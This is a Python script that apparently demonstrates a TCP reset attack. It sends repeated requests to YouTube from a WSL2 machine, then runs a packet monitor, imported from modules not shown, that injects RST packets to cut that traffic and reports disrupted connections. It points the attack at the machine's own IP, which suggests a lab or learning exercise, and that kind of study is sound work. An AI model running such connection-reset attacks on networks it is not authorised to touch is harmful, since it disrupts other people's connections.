#!/usr/bin/env python3
"""
WSL2 YouTube TCP Reset Attack Demo
Targets WSL2's own IP to attack traffic generated from WSL2
"""

import time
import threading
import requests
import subprocess
import signal
import sys
import os
from typing import Optional

# Add src directory to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Global variables
traffic_running = False
monitor = None

def get_wsl2_ip():
    """Get WSL2 IP address"""
    try:
        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
        ip = result.stdout.strip().split()[0]
        print(f"[WSL2] Detected IP: {ip}")
        return ip
    except Exception as e:
        print(f"[WSL2] Error getting IP: {e}")
        return "172.31.126.113"  # Fallback

def generate_youtube_traffic():
    """Generate HTTP requests to YouTube from WSL2"""
    global traffic_running
    
    youtube_urls = [
        "https://www.youtube.com/",
        "https://www.youtube.com/feed/trending", 
        "https://www.youtube.com/results?search_query=test",
        "https://ytimg.com/",
        "https://googlevideo.com/",
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    ]
    
    request_count = 0
    max_requests = 100
    
    print("[TRAFFIC] Starting YouTube traffic generation from WSL2...")
    
    while traffic_running and request_count < max_requests:
        try:
            url = youtube_urls[request_count % len(youtube_urls)]
            request_count += 1
            
            print(f"[TRAFFIC] Generated request {request_count}/{max_requests} to {url}")
            
            # Make HTTP request from WSL2
            response = requests.get(url, timeout=5, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            time.sleep(2)  # Wait between requests
            
        except Exception as e:
            print(f"[TRAFFIC] Request failed: {e}")
            time.sleep(1)
    
    print(f"[TRAFFIC] Traffic generation complete. Generated {request_count} requests.")

def traffic_loop():
    """Traffic generation loop"""
    generate_youtube_traffic()

def start_attack(target_ip: str, interface: str = "eth0") -> Optional[object]:
    """Start the TCP Reset attack targeting WSL2 IP"""
    try:
        print(f"[ATTACK] Starting WSL2 YouTube TCP Reset Attack...")
        print(f"[ATTACK] Target IP: {target_ip} (WSL2 itself)")
        print(f"[ATTACK] Interface: {interface}")
        
        # Import here to avoid circular imports - modules are in src/
        from config_manager import ConfigManager
        from packet_monitor import PacketMonitor
        
        # Create temporary config for WSL2
        config = ConfigManager()
        
        # Override config with WSL2 IP
        config.config.set('NETWORK', 'TARGET_IP', target_ip)
        config.config.set('NETWORK', 'INTERFACE', interface)
        
        # Create packet monitor targeting WSL2 IP
        monitor = PacketMonitor(target_ip, interface, config)
        
        # Start monitoring
        if monitor.start_monitoring():
            print("\n" + "=" * 50)
            print("🎯 WSL2 YOUTUBE ATTACK ACTIVE")
            print("=" * 50)
            print("Attacking YouTube traffic from WSL2!")
            print("Press Ctrl+C to stop")
            print("=" * 50)
            return monitor
        else:
            print("[ATTACK] Failed to start monitoring")
            return None
            
    except Exception as e:
        print(f"[ATTACK] Error: {e}")
        import traceback
        traceback.print_exc()
        return None

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    global traffic_running, monitor
    
    print("\n[DEMO] Stopping attack...")
    traffic_running = False
    
    if monitor:
        try:
            monitor.stop_monitoring()
        except:
            pass
    
    print("[DEMO] Attack stopped.")
    sys.exit(0)

def main():
    """Main demonstration"""
    global traffic_running, monitor
    
    print("=" * 60)
    print("WSL2 YOUTUBE TCP RESET ATTACK DEMO")
    print("=" * 60)
    print("This will:")
    print("1. Generate real YouTube traffic FROM WSL2")
    print("2. Monitor and attack that traffic with TCP RST")
    print("3. Target WSL2's own IP to intercept the traffic")
    print("4. Show attack effectiveness on WSL2-generated traffic")
    print()
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Get WSL2 IP
    wsl2_ip = get_wsl2_ip()
    
    input("Press Enter to start the demo...")
    
    # Start traffic generation
    traffic_running = True
    traffic_thread = threading.Thread(target=traffic_loop, daemon=True)
    traffic_thread.start()
    
    # Wait a moment for traffic to start
    time.sleep(3)
    
    # Start attack targeting WSL2 IP
    monitor = start_attack(wsl2_ip)
    
    if not monitor:
        print("[DEMO] Failed to start attack")
        return
    
    # Run for 3 minutes
    try:
        attack_duration = 180  # 3 minutes
        start_time = time.time()
        
        while time.time() - start_time < attack_duration:
            time.sleep(10)
            
            # Get statistics
            try:
                stats = monitor.get_statistics()
            except AttributeError:
                # Use backup method if get_statistics doesn't exist
                stats = {
                    'total_packets': getattr(monitor, 'packet_count', 0),
                    'youtube_packets': getattr(monitor, 'youtube_packet_count', 0),
                    'rst_packets': getattr(monitor, 'rst_count', 0),
                    'connections_disrupted': getattr(monitor, 'connections_attacked', 0)
                }
            elapsed = int(time.time() - start_time)
            
            print(f"[STATS] {elapsed}s | Packets: {stats['total_packets']} | "
                  f"YouTube: {stats['youtube_packets']} | RST: {stats['rst_packets']}")
        
        # Stop everything
        print("\n[DEMO] Attack duration completed")
        
    except KeyboardInterrupt:
        print("\n[DEMO] Attack interrupted by user")
    
    finally:
        # Clean shutdown
        traffic_running = False
        if monitor:
            monitor.stop_monitoring()
        
        # Show final statistics
        if monitor:
            try:
                stats = monitor.get_statistics()
            except AttributeError:
                # Use backup method if get_statistics doesn't exist  
                stats = {
                    'total_packets': getattr(monitor, 'packet_count', 0),
                    'youtube_packets': getattr(monitor, 'youtube_packet_count', 0),
                    'rst_packets': getattr(monitor, 'rst_count', 0),
                    'connections_disrupted': getattr(monitor, 'connections_attacked', 0)
                }
            
            print("\n" + "=" * 50)
            print("FINAL ATTACK STATISTICS")
            print("=" * 50)
            print(f"Total packets captured: {stats['total_packets']}")
            print(f"YouTube packets found: {stats['youtube_packets']}")  
            print(f"RST packets sent: {stats['rst_packets']}")
            print(f"Connections disrupted: {stats['connections_disrupted']}")
            print("=" * 50)
            
            if stats['rst_packets'] > 0:
                print("✅ WSL2 YouTube attack successful!")
            else:
                print("⚠️  No RST packets sent - check network configuration")

if __name__ == "__main__":
    main()
